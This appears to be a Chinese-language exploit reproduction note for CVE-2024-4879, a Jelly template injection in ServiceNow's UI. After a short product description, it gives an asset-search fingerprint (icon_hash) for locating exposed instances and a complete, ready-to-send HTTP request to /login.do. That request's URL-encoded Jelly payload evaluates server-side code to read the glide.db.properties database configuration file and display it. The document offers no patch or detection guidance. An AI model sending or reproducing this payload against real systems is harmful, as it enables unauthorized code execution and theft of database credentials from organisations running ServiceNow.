# ServiceNowUI Jelly模板注入漏洞(CVE-2024-4879)

# 一、漏洞简介
ServiceNow UI (用户界面)是ServiceNow平台提供的一种直观、现代化的用户交互方式。它采用响应式设计,能在各种设备上显示良好,并提供直观的导航菜单和面包屑功能,让用户能快速找到所需的功能和信息。同时,ServiceNow UI 支持个性化设置,用户可以自定义UI的外观和布局。针对移动设备,ServiceNow UI也进行了优化,提供了触摸优先的交互方式。总的来说, ServiceNow UI旨在为用户提供一种简单、统一且高效的使用体验,满足他们在ServiceNow平台上的各种需求。其存在CVE-2024-4879 Jelly模板注入漏洞攻击者可通过此漏洞执行代码，读取系统文件内容。

# 二、影响版本
ServiceNowUI

# 三、资产测绘
```plain
icon_hash="1701804003"
```

![1720973227671-1bceec68-98aa-4ef0-9f45-36b23f5dc3ba.png](./img/eccG_4hJp1WG4yXc/1720973227671-1bceec68-98aa-4ef0-9f45-36b23f5dc3ba-174564.png)

# 四、漏洞复现
```plain
GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E%22 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```

![1720973158902-350dace2-a8d1-4572-9aac-5d7b771fc939.png](./img/eccG_4hJp1WG4yXc/1720973158902-350dace2-a8d1-4572-9aac-5d7b771fc939-610384.png)



> 更新: 2024-08-12 17:16:00  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pz31klo12bw4m464>